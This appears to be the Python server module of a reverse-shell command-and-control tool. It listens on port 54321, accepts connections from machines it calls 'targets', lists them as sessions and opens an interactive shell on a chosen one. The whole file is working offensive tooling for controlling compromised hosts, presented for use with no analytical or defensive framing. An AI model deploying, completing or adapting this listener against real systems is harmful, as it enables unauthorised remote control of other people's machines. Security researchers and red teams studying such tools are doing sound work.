#!/usr/bin/env python3
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, SOCK_DGRAM
from socket import socket
from threading import Thread

from src.shell.shell import Shell
from src.stdout.color import Color
from src.stdout.output import usage
from src.stdout.title import Title


class Server:

    def __init__(self):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.ips = []
        self.targets = []
        self.clients = 0
        self.stop_threads = False

    def sock_object(self):
        sock = socket(AF_INET, SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        try:
            self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.sock.bind((ip, 54321))
            self.sock.listen(5)
        except OSError as err:
            print(Color(err).b_red())

    def thread(self):
        t1 = Thread(target=self.server)
        t1.start()

    def show_targets(self):
        count = 1
        for ip in self.ips:
            prompt = f"Session {str(count)}. <---> {str(ip)}"
            print(Color(prompt).grn())
            count += 1
        print()

    def start_session(self, cmd):
        try:
            sessions = (int(cmd[8:]) - 1)
            print(Color("[+] Connection Established\n").b_grn())
            cmd = Shell(self.ips, self.targets, sessions)
            cmd.shell()
        except (IndexError, ValueError, OSError):
            prompt = "[!] No Session Matches That Selection\n"
            print(Color(prompt).b_red())

    def exit_control(self):
        for target in self.targets:
            target.close()
        self.sock.close()
        self.stop_threads = True

    def control_centre(self):
        while True:
            cmd = input(f"{Title().icon} ")
            if (cmd[:7] in ("targets", "command")
                    and (not self.targets or not self.ips)):
                print(Color("[!] No Targets Found.").b_red())
                print(Color("[*] Is a Reverse Shell Running?\n").ylw())
                continue
            if cmd == "targets":
                self.show_targets()
            elif cmd[:7] == "session":
                self.start_session(cmd)
                continue
            elif cmd == "exit":
                self.exit_control()
            else:
                print(Color(usage(session=True)).ylw())

    def server(self):
        while True:
            if self.stop_threads:
                break
            self.sock.settimeout(1)
            try:
                target, ip = self.sock.accept()
                self.targets.append(target)
                self.ips.append(ip)
                connect = f"\nConnected to {self.ips[self.clients]}!"
                print(Color(connect).grn())
                self.clients += 1
            except OSError:
                pass
